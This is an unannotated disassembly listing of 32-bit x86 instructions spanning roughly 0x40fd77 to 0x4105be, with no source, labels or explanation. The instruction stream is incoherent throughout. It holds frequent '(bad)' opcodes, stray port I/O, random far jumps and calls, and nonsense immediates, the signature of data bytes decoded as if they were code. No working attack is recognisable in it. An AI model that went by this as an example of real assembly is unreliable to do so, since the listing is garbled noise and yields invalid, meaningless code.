  40fd77:	callw  0x6e9b
  40fd7b:	xchg   edi,eax
  40fd7c:	lock mov edi,DWORD PTR [ecx]
  40fd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd80:	cmp    BYTE PTR [eax-0x1d28888f],dh
  40fd86:	outs   dx,DWORD PTR ds:[esi]
  40fd87:	push   ebx
  40fd88:	loope  0x40fd18
  40fd8a:	daa    
  40fd8b:	imul   ebp,ebp,0x471d98af
  40fd91:	jmp    FWORD PTR [edx-0x18]
  40fd94:	xlat   BYTE PTR ds:[ebx]
  40fd95:	(bad)  
  40fd96:	xor    dh,BYTE PTR [ebx-0x4f9d2386]
  40fd9c:	mov    ecx,0x4afc8ac7
  40fda1:	mov    ds:0x58313d62,eax
  40fda6:	jecxz  0x40fdf4
  40fda8:	cmp    ecx,esp
  40fdaa:	or     ch,BYTE PTR [ebp-0xe]
  40fdad:	dec    edi
  40fdae:	hlt    
  40fdaf:	popa   
  40fdb0:	jne    0x40fd51
  40fdb2:	or     BYTE PTR [edi*8+0x7eaca1e2],dh
  40fdb9:	rcr    DWORD PTR [edi],cl
  40fdbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdbc:	les    edx,FWORD PTR [ebx]
  40fdbe:	int3   
  40fdbf:	and    eax,0x20fc6afa
  40fdc4:	jle    0x40fdb2
  40fdc6:	in     eax,0xd9
  40fdc8:	mov    ah,0x4b
  40fdca:	mov    ecx,0xf3fe4bb4
  40fdcf:	aaa    
  40fdd0:	xor    BYTE PTR [edi+0x2575e91a],0xa6
  40fdd7:	ret    0x5f82
  40fdda:	sbb    al,0x9d
  40fddc:	test   al,0xe7
  40fdde:	call   0xc39db80c
  40fde3:	push   ebx
  40fde4:	jne    0x40fd7f
  40fde6:	out    dx,eax
  40fde7:	inc    ebx
  40fde8:	add    eax,0xe44ccb03
  40fded:	ret    
  40fdee:	test   eax,0x5c172b2c
  40fdf3:	jl     0x40fe46
  40fdf5:	loopne 0x40fdde
  40fdf7:	xchg   ebp,eax
  40fdf8:	cmp    al,0x91
  40fdfa:	and    eax,0xe8e00bdb
  40fdff:	fisub  WORD PTR [edx-0x67]
  40fe02:	imul   edi,DWORD PTR [ebx*2+0x3cb52e52],0xffffffd7
  40fe0a:	cmp    bl,cl
  40fe0c:	mov    esp,0x2129815d
  40fe11:	mov    dh,0xe9
  40fe13:	mov    ecx,0xced0e340
  40fe18:	pop    ss
  40fe19:	push   ecx
  40fe1a:	ror    BYTE PTR [edi+0x625da3e9],1
  40fe20:	dec    eax
  40fe21:	push   ss
  40fe22:	dec    eax
  40fe23:	mov    edi,DWORD PTR [eax-0x79]
  40fe26:	out    dx,eax
  40fe27:	sbb    al,0x2a
  40fe29:	inc    eax
  40fe2a:	arpl   WORD PTR [ebp+ebp*2+0x69],bp
  40fe2e:	cdq    
  40fe2f:	dec    ebp
  40fe30:	jbe    0x40fdcd
  40fe32:	xchg   esp,eax
  40fe33:	or     BYTE PTR [ecx+edi*2-0x45],ch
  40fe37:	neg    BYTE PTR [edi]
  40fe39:	fld    DWORD PTR ds:0x7fb8cf39
  40fe3f:	out    0x1a,al
  40fe41:	mov    bh,0xa6
  40fe43:	in     eax,dx
  40fe44:	out    dx,al
  40fe45:	aaa    
  40fe46:	rol    DWORD PTR [eax+0x19],1
  40fe49:	(bad)  
  40fe4a:	adc    eax,0xfed8ddfe
  40fe4f:	popa   
  40fe50:	test   al,0xe7
  40fe52:	nop
  40fe53:	push   0x40e2f489
  40fe58:	cs mov bh,0x79
  40fe5b:	jecxz  0x40fea1
  40fe5d:	ins    BYTE PTR es:[edi],dx
  40fe5e:	and    bh,BYTE PTR ds:0x90e6eef8
  40fe64:	mov    ds:0xb9a13bed,al
  40fe69:	jmp    0xeaf461a7
  40fe6e:	shr    BYTE PTR [ebp-0x2335d4fc],1
  40fe74:	mov    bl,0x51
  40fe76:	mov    ch,0xdf
  40fe78:	push   ebp
  40fe79:	fsub   DWORD PTR [eax+esi*8-0x14]
  40fe7d:	icebp  
  40fe7e:	aas    
  40fe7f:	mov    al,ds:0xd89b2afe
  40fe84:	out    dx,al
  40fe85:	or     cl,BYTE PTR ds:0x34bedf37
  40fe8b:	out    0x63,al
  40fe8d:	mov    ch,0xc7
  40fe8f:	sub    al,dl
  40fe91:	push   ds
  40fe92:	ja     0x40fe1b
  40fe94:	mov    ecx,0xfde3ab5e
  40fe99:	add    al,0x15
  40fe9b:	pop    esp
  40fe9c:	frstor [eax]
  40fe9e:	jmp    0xf4ab:0x31e6316e
  40fea5:	push   edx
  40fea6:	fiadd  DWORD PTR ds:0x4955dda9
  40feac:	push   ds
  40fead:	and    eax,0x8d0ac6fe
  40feb2:	pop    ebp
  40feb3:	into   
  40feb4:	ror    BYTE PTR [edx+0x16cc8fb3],0x16
  40febb:	push   ss
  40febc:	ret    0x16aa
  40febf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fec0:	in     al,dx
  40fec1:	or     eax,0xbf52c6af
  40fec6:	jmp    0xef6ee363
  40fecb:	jmp    0x40fe4e
  40fecd:	fisubr WORD PTR [eax-0xd]
  40fed0:	bound  esp,QWORD PTR [ebx]
  40fed2:	iret   
  40fed3:	in     al,0xf
  40fed5:	gs pop esp
  40fed7:	stos   DWORD PTR es:[edi],eax
  40fed8:	leave  
  40fed9:	sar    BYTE PTR [edx+0x3736f9e4],cl
  40fedf:	mov    ah,0xa1
  40fee1:	adc    al,ah
  40fee3:	dec    edi
  40fee4:	repz neg BYTE PTR fs:[edx+0x9]
  40fee9:	and    al,0x90
  40feeb:	jb     0x40fed2
  40feed:	(bad)  [edx]
  40feef:	push   ecx
  40fef0:	mov    dl,0xca
  40fef2:	pop    edi
  40fef3:	les    eax,FWORD PTR [edi]
  40fef5:	data16 aad 0xf9
  40fef8:	sub    al,0xab
  40fefa:	inc    esp
  40fefb:	stos   BYTE PTR es:[edi],al
  40fefc:	pop    eax
  40fefd:	inc    esp
  40fefe:	ret    
  40feff:	fld    st(2)
  40ff01:	push   ss
  40ff02:	mov    gs,WORD PTR [esi-0x9b86299]
  40ff08:	cmp    ah,dl
  40ff0a:	mov    ds:0x94d3febc,eax
  40ff0f:	in     eax,dx
  40ff10:	jno    0x40ff3d
  40ff12:	jmp    0xc8fe:0xaf83ba17
  40ff19:	mov    al,ds:0xbe75b7eb
  40ff1e:	daa    
  40ff1f:	xlat   BYTE PTR ds:[ebx]
  40ff20:	ror    DWORD PTR [edi],1
  40ff22:	push   ss
  40ff23:	leave  
  40ff24:	(bad)  
  40ff25:	fstp   DWORD PTR [esi]
  40ff27:	lahf   
  40ff28:	enter  0xcfb,0x88
  40ff2c:	idiv   BYTE PTR [esi]
  40ff2e:	dec    eax
  40ff2f:	scas   eax,DWORD PTR es:[edi]
  40ff30:	sahf   
  40ff31:	mov    eax,0x7283ac75
  40ff36:	mov    ds,WORD PTR [edi]
  40ff38:	inc    ecx
  40ff39:	push   eax
  40ff3b:	in     al,0x3f
  40ff3d:	jmp    0x3513d40f
  40ff42:	cmp    al,0xf0
  40ff44:	mov    esp,0x1c93d259
  40ff49:	adc    dl,BYTE PTR [ecx+0x19]
  40ff4c:	xchg   esi,eax
  40ff4d:	or     cl,BYTE PTR [ecx]
  40ff4f:	xor    BYTE PTR [ecx],ah
  40ff51:	or     BYTE PTR [eax+0x25ebb7fe],0xb8
  40ff58:	aaa    
  40ff59:	bound  edx,QWORD PTR [ebx+0x2dc1d87b]
  40ff5f:	das    
  40ff60:	push   ebx
  40ff61:	loope  0x40ff76
  40ff63:	int    0x66
  40ff65:	mov    dh,0xd
  40ff67:	cwde   
  40ff68:	nop
  40ff69:	out    0x78,al
  40ff6b:	test   eax,0xf1d66bf9
  40ff70:	push   es
  40ff71:	jle    0x40ffe3
  40ff73:	(bad)  
  40ff74:	jbe    0x40ffd8
  40ff76:	mov    ebx,0x5b2edfa0
  40ff7b:	cmp    eax,0xe51500cd
  40ff80:	aad    0x87
  40ff82:	int    0x91
  40ff84:	retf   0x90ef
  40ff87:	sbb    DWORD PTR fs:[esp+eax*1],edx
  40ff8b:	jecxz  0x40ffcd
  40ff8d:	or     DWORD PTR [edx-0x3a],ebx
  40ff90:	xchg   DWORD PTR [esi-0x74],eax
  40ff93:	sub    BYTE PTR [esp+esi*1],bh
  40ff96:	mov    bl,cl
  40ff98:	xchg   ebp,eax
  40ff99:	rcl    DWORD PTR [ebp-0x2e5784b3],1
  40ff9f:	dec    ebp
  40ffa0:	push   ds
  40ffa1:	add    bh,BYTE PTR [eax+0x2b]
  40ffa4:	fdiv   DWORD PTR [ecx-0x4e5dc94b]
  40ffaa:	mov    ?,WORD PTR [edi+esi*2]
  40ffad:	mov    al,0xc6
  40ffaf:	inc    ebp
  40ffb0:	mov    bl,0xe5
  40ffb2:	xor    BYTE PTR [edx-0x3d372c40],0x4
  40ffb9:	outs   dx,BYTE PTR ds:[esi]
  40ffba:	sbb    eax,0x289aacb2
  40ffbf:	adc    esp,eax
  40ffc1:	push   eax
  40ffc2:	stos   DWORD PTR es:[edi],eax
  40ffc3:	imul   ebp,DWORD PTR [eax+0x2c],0x30
  40ffc7:	sbb    al,0x81
  40ffc9:	lahf   
  40ffca:	sub    dl,BYTE PTR [esi+0x3e]
  40ffcd:	sub    dh,0xfa
  40ffd0:	lods   eax,DWORD PTR ds:[esi]
  40ffd1:	rol    DWORD PTR [edi],0x26
  40ffd4:	not    dh
  40ffd6:	xor    edx,DWORD PTR [edx-0x7bd805dc]
  40ffdc:	jp     0x40ff89
  40ffde:	push   0x47b1c5fe
  40ffe3:	inc    ebx
  40ffe4:	add    cl,ch
  40ffe6:	std    
  40ffe7:	cmc    
  40ffe8:	push   esp
  40ffe9:	jno    0x410000
  40ffeb:	xchg   esi,eax
  40ffec:	xor    al,0x7b
  40ffee:	pop    es
  40ffef:	dec    ebp
  40fff0:	mov    bh,0xe2
  40fff2:	mov    dl,0xca
  40fff4:	or     DWORD PTR [ebx-0x3aa69b00],esi
  40fffa:	fisttp QWORD PTR [ebp-0x182875da]
  410000:	lods   eax,DWORD PTR ds:[esi]
  410001:	cwde   
  410002:	ja     0x41001e
  410004:	mov    eax,ds:0xb9000d95
  410009:	shl    BYTE PTR [ebp+0x7fff251b],1
  41000f:	mov    edi,0x940074f6
  410014:	push   esi
  410015:	dec    eax
  410016:	pop    ds
  410017:	fnstenv ds:0xb60d8f5a
  41001d:	pop    ebp
  41001e:	fwait
  41001f:	aaa    
  410020:	jecxz  0x41003c
  410022:	pop    ebp
  410023:	scas   eax,DWORD PTR es:[edi]
  410024:	pop    edi
  410025:	dec    edx
  410026:	sub    eax,0x4a05f9b8
  41002b:	and    ch,cl
  41002d:	jmp    0x40ffe3
  41002f:	iret   
  410030:	vpackssdw ymm1,ymm6,ymm4
  410034:	push   ss
  410035:	or     DWORD PTR [edi],0x7d
  410038:	out    0xcb,al
  41003a:	mov    al,0xe3
  41003c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41003d:	sahf   
  41003e:	adc    al,0xd2
  410040:	add    BYTE PTR [ecx],0xbf
  410043:	mov    cs,WORD PTR [edx-0x658bf63f]
  410049:	fadd   QWORD PTR [esi+edi*4+0x30003597]
  410050:	aas    
  410051:	int3   
  410052:	lods   eax,DWORD PTR ds:[esi]
  410053:	mov    esi,esi
  410055:	pusha  
  410056:	stos   BYTE PTR es:[edi],al
  410057:	aas    
  410058:	xchg   edx,eax
  410059:	ja     0x410022
  41005b:	inc    ecx
  41005c:	js     0x4100a3
  41005e:	aad    0xce
  410060:	(bad)
  410064:	imul   esp,DWORD PTR [ecx],0x44
  410067:	pop    edi
  410068:	call   0xfd08:0x7c1eb977
  41006f:	and    al,0x42
  410071:	in     eax,dx
  410072:	and    ebx,0x2654da0c
  410078:	call   0x2997:0xde0ddc01
  41007f:	rol    ebp,0x97
  410082:	xchg   ebx,eax
  410083:	add    ebx,DWORD PTR [edi-0x67]
  410086:	arpl   WORD PTR [eax+0x5c948bc2],dx
  41008c:	jns    0x4100f5
  41008e:	aaa    
  41008f:	in     eax,0xa6
  410091:	pop    ecx
  410092:	xchg   esi,eax
  410093:	test   eax,0xccea4e81
  410098:	imul   eax,DWORD PTR [esi],0xffffffa4
  41009b:	mov    edi,0x427d557a
  4100a0:	in     al,dx
  4100a1:	jge    0x410080
  4100a3:	out    0x75,al
  4100a5:	mov    DWORD PTR [eax],0x4f4e065c
  4100ab:	cmovbe esp,ebp
  4100ae:	xchg   ebp,eax
  4100af:	repz or BYTE PTR [eax+0xc],bl
  4100b3:	dec    ecx
  4100b4:	jns    0x4100cb
  4100b6:	dec    edi
  4100b7:	xchg   ecx,eax
  4100b8:	retf   0xd3a4
  4100bb:	cwde   
  4100bc:	adc    ch,BYTE PTR ds:[esi+0x67]
  4100c0:	(bad)  
  4100c1:	aas    
  4100c2:	out    dx,eax
  4100c3:	add    DWORD PTR [ebp-0x4aef54b5],edi
  4100c9:	xchg   ebp,eax
  4100ca:	adc    esi,DWORD PTR [eax-0x38]
  4100cd:	adc    DWORD PTR [ebx-0x18],eax
  4100d0:	repnz test al,0xab
  4100d3:	dec    ecx
  4100d4:	fcomp  QWORD PTR [esi-0x106ba740]
  4100da:	inc    eax
  4100db:	repnz cmp al,0x92
  4100de:	pusha  
  4100df:	jo     0x410076
  4100e1:	cmp    BYTE PTR [edx-0x5cc138],bh
  4100e7:	xchg   sp,ax
  4100e9:	jmp    0x4e59890d
  4100ee:	and    DWORD PTR [esi+0x41],esp
  4100f1:	xchg   ah,bh
  4100f3:	call   0xc5f9:0xf0d4fd93
  4100fa:	push   edx
  4100fb:	out    0x9b,al
  4100fd:	mov    al,ds:0x82f0e24e
  410102:	std    
  410103:	neg    DWORD PTR [ebx-0x715f4cdc]
  410109:	add    ebx,DWORD PTR [edi-0x39996309]
  41010f:	dec    esi
  410110:	inc    ebp
  410111:	enter  0x1685,0xbf
  410115:	fimul  DWORD PTR ds:0x6774be31
  41011b:	loop   0x410116
  41011d:	mov    gs,WORD PTR [eax+eiz*4]
  410120:	push   edx
  410121:	sahf   
  410122:	(bad)  
  410123:	pop    eax
  410124:	shl    BYTE PTR [ebp-0x25],1
  410127:	repz imul ebx,DWORD PTR [esi+eax*1+0x6f],0xabf60909
  410130:	lods   eax,DWORD PTR ds:[esi]
  410131:	add    DWORD PTR [ebx+0x6a08facd],edi
  410137:	mov    edx,0x640bc59e
  41013c:	cmc    
  41013d:	dec    esp
  41013e:	sub    esp,DWORD PTR [ebx-0x1bea6934]
  410144:	(bad)  
  410145:	dec    esi
  410146:	cmp    eax,0xb8d64baf
  41014b:	icebp  
  41014c:	test   al,0x3a
  41014e:	aaa    
  41014f:	std    
  410150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410151:	popf   
  410152:	mov    eax,ds:0x3a5305cf
  410157:	in     eax,dx
  410158:	inc    eax
  410159:	dec    DWORD PTR [eax+0xc1043bb]
  41015f:	cmp    DWORD PTR [ecx-0x44],esi
  410162:	imul   eax,DWORD PTR [esi-0x6d38d98e],0xd708a8c6
  41016c:	jne    0x410169
  41016e:	(bad)  
  41016f:	call   0xd7bea47f
  410174:	xchg   ecx,eax
  410175:	lock jge 0x410131
  410178:	pop    esi
  410179:	mov    bh,al
  41017b:	icebp  
  41017c:	pop    ebx
  41017d:	mov    eax,0xeee7c4e0
  410182:	(bad)  [esp+eax*1]
  410185:	xchg   ebp,eax
  410186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410187:	repnz inc ecx
  410189:	repz adc ecx,edi
  41018c:	dec    esi
  41018d:	stos   DWORD PTR es:[edi],eax
  41018e:	sub    DWORD PTR [ebx-0x18],ebx
  410191:	outs   dx,DWORD PTR ds:[esi]
  410192:	jno    0x41011e
  410194:	sub    DWORD PTR [edi-0x6e7dafad],0x43acde53
  41019e:	and    eax,0x5fda29d1
  4101a3:	mov    edi,0xbd0f3b6a
  4101a8:	xchg   esi,eax
  4101a9:	or     eax,0x1e9b0451
  4101ae:	mov    dh,0xd1
  4101b0:	sbb    ecx,edi
  4101b2:	outs   dx,BYTE PTR ds:[esi]
  4101b3:	in     eax,dx
  4101b4:	shl    BYTE PTR [ebx],0x4a
  4101b7:	xchg   ebx,eax
  4101b8:	xchg   dl,bh
  4101ba:	mov    edi,gs
  4101bc:	sbb    ah,BYTE PTR [edi+0x612f552a]
  4101c2:	in     eax,dx
  4101c3:	sub    al,BYTE PTR [edx*2+0x4b484979]
  4101ca:	xor    BYTE PTR [edx-0x57f11790],0x2
  4101d1:	jne    0x4101d2
  4101d3:	lock jge 0x41020a
  4101d6:	push   ds
  4101d7:	add    al,0xdb
  4101d9:	rcr    DWORD PTR [edi],cl
  4101db:	retf   
  4101dc:	xchg   ebx,eax
  4101dd:	sbb    ah,BYTE PTR [ecx]
  4101df:	(bad)  
  4101e0:	push   esp
  4101e1:	adc    ebx,0xf8151c95
  4101e7:	fcom   DWORD PTR [edx]
  4101e9:	inc    edi
  4101ea:	add    eax,0x56932995
  4101ef:	cmc    
  4101f0:	mov    WORD PTR [edx-0x17e92781],es
  4101f6:	rcr    BYTE PTR [edi],1
  4101f8:	dec    eax
  4101f9:	push   ds
  4101fa:	rcr    DWORD PTR [esi+0x5126d7b1],0x75
  410201:	dec    edx
  410202:	(bad)  [ebx-0x4d]
  410205:	jns    0x410230
  410207:	mov    dh,0x48
  410209:	out    dx,eax
  41020a:	mov    DWORD PTR [eax],ebp
  41020c:	(bad)  
  41020d:	lahf   
  41020e:	outs   dx,DWORD PTR ds:[esi]
  41020f:	fisubr DWORD PTR [ebx-0x65]
  410212:	popa   
  410213:	jb     0x41022e
  410215:	cmp    eax,0x7ed8b5d6
  41021a:	push   ds
  41021b:	push   esi
  41021c:	sub    DWORD PTR [ebx],ebx
  41021e:	mov    ebx,0x445251d5
  410223:	les    ecx,FWORD PTR [edx+0xcf2c8fc]
  410229:	mov    dh,BYTE PTR [edi+0x7f]
  41022c:	cmp    ecx,DWORD PTR [ebx+ecx*8-0x5]
  410230:	ss in  al,dx
  410232:	sti    
  410233:	mov    edi,0x423ff8e6
  410238:	adc    BYTE PTR [ebp+eax*1+0x6f95c4ed],0x87
  410240:	ds out 0x39,ax
  410244:	sbb    DWORD PTR [ebp+0x5d],edi
  410247:	sbb    DWORD PTR [eax-0x2c6818c5],ebx
  41024d:	cmp    BYTE PTR [edx-0x458b610a],0x85
  410254:	sub    DWORD PTR [esi-0x5a],ebp
  410257:	fmul   QWORD PTR [eax-0x5a418ef8]
  41025d:	inc    esp
  41025e:	dec    ebx
  41025f:	jne    0x4102c5
  410261:	xchg   DWORD PTR [esi],esp
  410263:	inc    edx
  410264:	cmp    DWORD PTR [edi-0x62a94ad9],esp
  41026a:	fisttp DWORD PTR [eax]
  41026c:	test   DWORD PTR [eax],edi
  41026e:	mov    ch,0x4f
  410270:	call   0xf37ceeb8
  410275:	xchg   edi,eax
  410276:	jnp    0x41022f
  410278:	pop    eax
  410279:	test   eax,0xc53ef9ad
  41027e:	sar    BYTE PTR [ebp-0x70],cl
  410281:	not    DWORD PTR [edx+eiz*8+0x6c]
  410285:	arpl   bp,ax
  410287:	mov    edi,0x5205e553
  41028c:	mov    ds:0x14d039d3,al
  410291:	rcl    BYTE PTR [ecx-0x30],1
  410294:	add    ebx,edx
  410296:	dec    eax
  410297:	pop    esp
  410298:	(bad)  
  410299:	xor    ecx,esi
  41029b:	add    BYTE PTR [esi],bl
  41029d:	(bad)  
  41029e:	(bad)  
  41029f:	data16 cli 
  4102a1:	cmp    al,0x74
  4102a3:	ins    BYTE PTR es:[edi],dx
  4102a4:	mov    al,0xec
  4102a6:	inc    ebp
  4102a7:	test   DWORD PTR ds:[esi+0x60],0xdee2aef9
  4102af:	int3   
  4102b0:	ds inc ebp
  4102b2:	pop    esi
  4102b3:	fwait
  4102b4:	sbb    ah,dl
  4102b6:	dec    ebp
  4102b7:	cmp    cl,BYTE PTR [eax-0x37]
  4102ba:	mov    ebx,0xc46c560
  4102bf:	je     0x410270
  4102c1:	out    0xfe,al
  4102c3:	dec    ebx
  4102c4:	daa    
  4102c5:	xchg   DWORD PTR [edx+0x6a],edx
  4102c8:	xor    BYTE PTR [ebx],al
  4102ca:	fcomp  DWORD PTR [ebx+0x55]
  4102cd:	push   eax
  4102ce:	adc    edx,DWORD PTR [ecx]
  4102d0:	test   eax,0xd7964662
  4102d5:	jnp    0x410293
  4102d7:	aas    
  4102d8:	shr    DWORD PTR [eax],0x25
  4102db:	popf   
  4102dc:	or     al,0x14
  4102de:	js     0x410331
  4102e0:	into   
  4102e1:	cmp    DWORD PTR [esi+0x24],esi
  4102e4:	test   DWORD PTR [edi+0x1b],ebp
  4102e7:	sbb    BYTE PTR [edx-0x38],bh
  4102ea:	pop    esi
  4102eb:	push   0xffffffe9
  4102ed:	jmp    0x85a2445b
  4102f2:	psrld  mm1,QWORD PTR [eax+0x15]
  4102f6:	loopne 0x4102df
  4102f8:	xchg   BYTE PTR [edi+0x33],ah
  4102fb:	lods   al,BYTE PTR ds:[esi]
  4102fc:	adc    dl,BYTE PTR [edx+0x4b]
  4102ff:	fs int 0x6a
  410302:	jbe    0x4102e2
  410304:	rcr    BYTE PTR [edi],1
  410306:	add    BYTE PTR [edi+0x28],cl
  410309:	aam    0xe6
  41030b:	xchg   BYTE PTR fs:[ebx+0x79],ch
  41030f:	outs   dx,BYTE PTR ds:[esi]
  410310:	rcr    bl,cl
  410312:	xchg   ebx,eax
  410313:	mov    bh,0xcc
  410315:	pop    es
  410316:	out    0x46,al
  410318:	mov    cl,0x92
  41031a:	cmp    al,0x7
  41031c:	out    0x3b,al
  41031e:	xor    dh,BYTE PTR [esi+0x27]
  410321:	pop    edi
  410322:	(bad)  
  410324:	inc    edx
  410325:	push   es
  410326:	push   0x61
  410328:	in     al,0xc6
  41032a:	mov    bh,0x56
  41032c:	fisubr DWORD PTR [ebx+0xa4c7aa7]
  410332:	push   0xffffffb0
  410334:	mov    ecx,0x310cbad0
  410339:	and    al,0x18
  41033b:	test   eax,0x6c8407a0
  410340:	cmp    BYTE PTR [esi],bh
  410342:	shl    DWORD PTR [ebp+0x29ecc5b6],cl
  410348:	and    eax,0xd152cfc9
  41034d:	sbb    ah,bh
  41034f:	retf   
  410350:	xchg   esp,eax
  410351:	mov    esp,0xe3f5a11b
  410356:	sub    ah,bl
  410358:	sub    DWORD PTR [edx+0x2169815e],0x101f5e73
  410362:	jbe    0x41035b
  410364:	call   0x1791:0x9d815ed2
  41036b:	arpl   WORD PTR [edx-0x5011f082],bp
  410371:	push   esp
  410372:	inc    ecx
  410373:	jb     0x4103ea
  410375:	test   al,0xc0
  410377:	call   0xe3d3:0x61f46ea3
  41037e:	jle    0x410307
  410380:	push   esi
  410381:	sbb    BYTE PTR [eax+0x5c],bh
  410384:	(bad)  
  410385:	mov    ?,edx
  410387:	lock dec esp
  410389:	jmp    0x261b:0xe13eadc0
  410390:	mov    ch,0xa
  410392:	sahf   
  410393:	adc    BYTE PTR [eax-0x55],bl
  410396:	outs   dx,BYTE PTR ds:[esi]
  410397:	adc    al,0xb1
  410399:	icebp  
  41039a:	gs pop ebp
  41039c:	(bad)  
  41039d:	ins    DWORD PTR es:[edi],dx
  41039e:	mov    ah,0x1d
  4103a0:	mov    dh,0xd0
  4103a2:	xchg   ebp,eax
  4103a3:	iret   
  4103a4:	mov    al,ds:0x2bbf755a
  4103a9:	shl    DWORD PTR [esi-0x60bd3373],cl
  4103af:	adc    DWORD PTR [edx],esi
  4103b1:	adc    al,cl
  4103b3:	clc    
  4103b4:	mov    ebx,0x15a1daae
  4103b9:	fcomp  DWORD PTR [eax+0x23]
  4103bc:	mov    esp,0x9ff55bce
  4103c1:	in     al,dx
  4103c2:	xchg   edx,eax
  4103c3:	pop    edi
  4103c4:	dec    eax
  4103c5:	dec    ebp
  4103c6:	loopne 0x410364
  4103c8:	daa    
  4103c9:	stos   BYTE PTR es:[edi],al
  4103ca:	xchg   esp,eax
  4103cb:	retf   
  4103cc:	jle    0x41041a
  4103ce:	adc    DWORD PTR [edx+ecx*8],0x96182edb
  4103d5:	popf   
  4103d6:	std    
  4103d7:	xor    cl,BYTE PTR [ecx]
  4103d9:	pop    esp
  4103da:	sti    
  4103db:	jns    0x410436
  4103dd:	or     DWORD PTR [esi],edi
  4103df:	cli    
  4103e0:	jno    0x4103eb
  4103e2:	inc    ecx
  4103e3:	(bad)  
  4103e4:	add    eax,DWORD PTR es:[eax+0x46]
  4103e8:	pop    ss
  4103e9:	fsubr  QWORD PTR ds:0xfea018c8
  4103ef:	leave  
  4103f0:	sbb    ah,BYTE PTR [edx]
  4103f2:	adc    eax,0x339631db
  4103f7:	idiv   DWORD PTR [edx]
  4103f9:	sub    BYTE PTR [ebx+0x40],ah
  4103fc:	jmp    0xe36b:0x37acc04d
  410403:	jae    0x410397
  410405:	mov    ah,0x6e
  410407:	or     ecx,ecx
  410409:	lods   al,BYTE PTR ds:[esi]
  41040a:	dec    ecx
  41040b:	sbb    edi,DWORD PTR [edi+eax*4]
  41040e:	dec    edi
  41040f:	(bad)  
  410410:	mov    ah,0x46
  410412:	push   eax
  410413:	mov    eax,0x82f6ad6e
  410418:	outs   dx,BYTE PTR ds:[esi]
  410419:	je     0x41039d
  41041b:	xlat   BYTE PTR ds:[ebx]
  41041c:	cmp    bl,BYTE PTR [ebx-0x80]
  41041f:	mov    al,0xc4
  410421:	jp     0x4103d8
  410423:	cwde   
  410424:	inc    esi
  410425:	push   ebx
  410426:	dec    edx
  410427:	jge    0x410415
  410429:	(bad)  
  41042b:	pop    edx
  41042c:	stos   BYTE PTR es:[di],al
  41042e:	das    
  41042f:	xlat   BYTE PTR ds:[ebx]
  410430:	fsincos 
  410432:	test   BYTE PTR [ebx+0x17ba9c30],al
  410438:	fnstcw WORD PTR [ecx+0x1c]
  41043b:	and    al,0x98
  41043d:	pushf  
  41043e:	xlat   BYTE PTR ds:[ebx]
  41043f:	pop    ds
  410440:	in     eax,0x60
  410442:	(bad)  
  410443:	test   BYTE PTR [edi+0x512ddf7f],0xe1
  41044a:	in     eax,0x85
  41044c:	xor    al,0xfa
  41044e:	imul   ebx,edx,0xe00c77db
  410454:	sub    ebx,DWORD PTR [ecx+0x52f07906]
  41045a:	sbb    ebx,DWORD PTR [eax-0x2f86db32]
  410460:	mov    esi,0xdf7ff5ce
  410465:	pusha  
  410466:	mov    ds:0x4e86fad9,eax
  41046b:	retf   
  41046c:	inc    ebx
  41046d:	pushf  
  41046e:	jmp    0x5594:0xf717f8ba
  410475:	je     0x41047a
  410477:	cmp    BYTE PTR [eax+0x503eb030],dh
  41047d:	jo     0x41040a
  41047f:	nop
  410480:	pop    esp
  410481:	pop    ebx
  410482:	arpl   WORD PTR [edi],dx
  410484:	sub    bh,al
  410486:	paddd  mm3,QWORD PTR [ebx-0x60a9c9e1]
  41048d:	out    dx,eax
  41048e:	mov    es,WORD PTR [edi+0x6d256e73]
  410494:	or     eax,0xe3b0
	...
  410511:	add    BYTE PTR [eax],al
  410513:	add    BYTE PTR [ebp+0x6b],ah
  410516:	sub    edi,0xffffff8f
  410519:	out    dx,eax
  41051a:	ins    DWORD PTR es:[edi],dx
  41051b:	jmp    0x410577
  41051d:	sar    ecx,cl
  41051f:	sbb    edx,edx
  410521:	(bad)  
  410522:	sub    BYTE PTR [edi+edx*2+0x6b0000b0],ah
  410529:	pop    es
  41052a:	add    BYTE PTR [eax],al
  41052c:	or     DWORD PTR [edi-0x5138bd65],esp
  410532:	loop   0x410558
  410534:	test   al,0xf3
  410536:	fs fdivr st(3),st
  410539:	je     0x4104f5
  41053b:	sbb    eax,0x6c29db35
  410540:	int    0x8f
  410542:	xchg   edi,eax
  410543:	mov    ss:0xcde19db8,al
  410549:	call   0xfdf5:0x2d5cf078
  410550:	add    DWORD PTR [edi-0x24],esi
  410553:	push   0x8891a62d
  410558:	xor    bl,bh
  41055a:	jo     0x4105b4
  41055c:	stos   BYTE PTR es:[edi],al
  41055d:	je     0x41057e
  41055f:	int    0x27
  410561:	jo     0x4104fd
  410563:	add    DWORD PTR [ecx],ebp
  410565:	sbb    dl,BYTE PTR [ebx-0x1a]
  410568:	lea    esi,[eax]
  41056a:	cmp    ebp,eax
  41056c:	repnz (bad) 
  41056e:	stc    
  41056f:	dec    esi
  410570:	les    esp,FWORD PTR [eax]
  410572:	jbe    0x410566
  410574:	push   esi
  410575:	in     eax,0xf6
  410577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410578:	popf   
  410579:	mov    bh,0x8f
  41057b:	stos   DWORD PTR es:[edi],eax
  41057c:	sti    
  41057d:	xlat   BYTE PTR ds:[ebx]
  41057e:	mov    dh,0xb9
  410580:	in     eax,0x32
  410582:	psrad  mm1,mm5
  410585:	xor    BYTE PTR [ecx+0x39],dl
  410588:	mov    ds:0x26f658fa,al
  41058d:	ficomp WORD PTR [eax]
  41058f:	repz mov edi,0x8fab5c4d
  410595:	mov    cl,0x8
  410597:	stos   BYTE PTR es:[edi],al
  410598:	sbb    BYTE PTR [esi],bh
  41059a:	enter  0xb65d,0xc
  41059e:	cwde   
  41059f:	sub    eax,DWORD PTR [edx-0x3e]
  4105a2:	popa   
  4105a3:	lahf   
  4105a4:	pop    ebx
  4105a5:	fidiv  DWORD PTR [esi]
  4105a7:	mov    esi,0x345b6e95
  4105ac:	mov    esi,0xf2a9a06
  4105b1:	fisttp QWORD PTR [eax+0x3a]
  4105b4:	fcom   DWORD PTR [ecx+eax*8]
  4105b7:	mov    ebx,0x18e0dd61
  4105bc:	fwait
  4105bd:	xchg   ebx,eax
  4105be:	pop    ss
